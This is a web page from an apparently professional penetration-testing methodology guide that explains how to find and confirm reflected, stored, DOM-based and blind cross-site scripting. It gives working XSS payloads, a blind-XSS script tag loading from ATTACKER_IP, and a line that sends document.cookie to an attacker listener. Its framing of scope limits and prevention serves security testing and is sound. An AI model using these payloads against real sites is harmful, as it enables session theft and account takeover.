---
layout: page
title: "Cross-Site Scripting"
subtitle: "Finding reflected, stored and DOM-based sinks and confirming script execution in the browser"
permalink: /methodology/web-app/xss/
---

Cross-site scripting (XSS) occurs when input is written into a page without encoding, so the browser runs it as script or markup. The task is to find each place where input is shown, identify whether the server or the client writes it, and confirm execution in the browser. Impact is demonstrated only with the minimum payload needed to prove it.

## Types of XSS

| Type | Where the input is processed | Persistence |
|---|---|---|
| Stored | Saved in the back-end database and displayed on later page loads, such as comments or profiles | Persistent. Affects every viewer of the page |
| Reflected | Returned by the server in the same response, such as a search result or error message | Non-persistent. The victim must open a crafted link |
| DOM based | Read and written by client-side JavaScript. The server does not see the value | Non-persistent. Often reached through the URL fragment or `document.URL` |

## Workflow

1. Find reflection. Submit a unique marker, then the test payload below. Search the page source for the marker and note its context: HTML body, an attribute, or a JavaScript string.

```html
<script>alert(window.origin)</script>
```

If the browser does not render the payload as markup, the output is probably encoded. Record that result.

2. Classify reflected and stored behaviour. Send a request and reload the page. If the payload is still shown without being submitted again, it is stored. If it appears only in the response to the submitted request, it is reflected. In the network panel, a GET request means the payload can be delivered in a link.

3. Check for DOM processing. The page changes its content without making an HTTP request, and the input appears in the URL after `#` or in a value read from `document.URL`. Identify the source, which is the input, and the sink, which writes it. Common sinks are `innerHTML`, `outerHTML`, `document.write()` and jQuery functions such as `html()`, `append()` and `after()`.

A payload that uses an event handler works where `innerHTML` ignores `<script>` tags:

```html
<img src="" onerror=alert(window.origin)>
```

4. Automated discovery. Burp Suite, ZAP and Nessus detect all three types. XSStrike is an open-source option:

```bash
python xsstrike.py -u "http://TARGET_URL/index.php?task=test"
```

Scanners miss context-specific payloads, so manual testing is still required. Payload lists from public collections are useful only when the context matches.

5. Blind XSS. When the input is shown only in a panel that the tester cannot see, such as an admin view of a support ticket, use a remote script whose path identifies the field. Start a listener on the attacker host:

```bash
sudo php -S 0.0.0.0:80
```

Then submit one payload per field, each naming that field:

```html
<script src="http://ATTACKER_IP/fullname"></script>
```

A request for `/fullname` on the listener shows that the field was rendered. Skip fields such as email or password when validation or hashing makes them unlikely to be rendered.

## Impact demonstrations

Run these only on test accounts within the approved scope.

- Page content. The DOM properties change what a viewer sees:

```html
<script>document.title = 'Example Title'</script>
<script>document.body.style.background = "#141d2b"</script>
```

- Session data. Sending the cookie to a listener shows that the session cookie is readable by script. Cookies marked `HttpOnly` cannot be read this way, so a readable session cookie is a finding in itself:

```javascript
new Image().src='http://ATTACKER_IP/index.php?c='+document.cookie;
```

- Phishing. Injected markup can present a fake login form. This is high risk and is only appropriate in an approved phishing scenario. Never capture real user credentials. Proof that the form can be injected is normally enough for the report.

## What to look for

- Output reflected into an HTML, attribute or script context without encoding.
- Error messages that repeat the input.
- Inputs that are rendered in an admin area, which indicate a possible blind XSS.
- Cookies without `HttpOnly`, which increase the impact of any script execution.

## Pitfalls

- A cross-domain iframe may contain the payload, so the main application is not affected. Check the origin of the rendered output.
- Some browsers block `alert()` in certain places. `print()` is an alternative that is rarely blocked.
- Front-end validation, such as an email format check, is not a control. Test the back end directly.
- A failed payload may be correct for a different context. Identify the context before changing the payload.

> Defense: encode output for the context where it is written and avoid raw HTML sinks. Set a Content Security Policy and `HttpOnly` cookies as a second layer. See [Prevention and remediation](/methodology/web-app/prevention/).
{: .info }
